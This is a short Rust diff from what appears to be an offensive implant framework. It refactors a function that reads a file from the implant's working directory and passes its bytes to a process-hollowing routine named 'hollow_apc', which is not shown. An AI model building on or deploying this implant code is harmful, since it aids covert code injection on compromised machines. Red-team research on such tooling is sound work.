@@ -1,36 +1,35 @@
-use std::fs::File;
+use std::{
+    fs::{self, File},
+    io::Read,
+    path::PathBuf,
+};
 
 use shared::tasks::WyrmResult;
 
-use crate::spawn::hollow_apc::spawn_sibling;
+use crate::{
+    native::filesystem::{PathParseType, parse_path},
+    spawn::hollow_apc::spawn_sibling,
+};
 
 pub mod hollow_apc;
 
 pub struct Spawn;
 
 impl Spawn {
-    pub fn spawn_sibling(path: &str) -> WyrmResult<String> {
-        let f = match File::open(path) {
-            Ok(f) => f,
-            Err(e) => {
-                let msg: String = format!("Failed to open file. {}", e.to_string());
+    pub fn spawn_sibling(path: &str, implant_working_dir: &PathBuf) -> WyrmResult<String> {
+        let path = match parse_path(path, implant_working_dir, PathParseType::File) {
+            WyrmResult::Ok(p) => p,
+            WyrmResult::Err(e) => {
                 #[cfg(debug_assertions)]
-                {
-                    use shared::pretty_print::print_failed;
+                println!("Failed to parse path {path}. {e}");
 
-                    print_failed(&msg);
-                }
-
-                return WyrmResult::Err(msg);
+                return WyrmResult::Err(e);
             }
         };
 
-        let len = match f.metadata() {
-            Ok(m) => m.len(),
-            Err(e) => return WyrmResult::Err(e.to_string()),
+        let Ok(buf) = fs::read(path) else {
+            return WyrmResult::Err(format!("Could not read file"));
         };
-
-        let buf = Vec::with_capacity(len as usize);
         spawn_sibling(buf)
     }
 }
